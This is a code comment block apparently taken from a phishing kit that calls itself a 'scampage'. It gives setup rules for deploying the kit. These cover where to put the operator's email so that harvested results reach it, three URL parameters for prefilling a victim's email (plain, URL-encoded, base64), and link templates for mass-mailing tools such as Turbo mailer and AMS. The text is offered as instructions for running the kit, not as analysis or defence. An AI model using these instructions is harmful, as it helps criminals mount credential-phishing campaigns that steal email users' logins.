﻿/* 
Read Rules:

1. Normal asking email at patch /login/

2. Auto Grab at patch /

3. Change with your email Result.php

4. This scampage support 3 grab
   *) ?confirm= real email
   *) ?code= urlcode email
   *) ?referral= base64 email

5. Set up on sender
   *) If you use Turbo mailer: https://yourlink.com/patch/?yourgrab=%0%			<-- real email
   *) If you use AMS: https://yourlink.com/patch/?yourgrab=%RCPT_ADDRESS%		<-- urlcode email
   *) If you use B-29, xSender, eMailer: https://yourlink.com/patch/{NEWAUTOLINK}	<-- base64 email

*/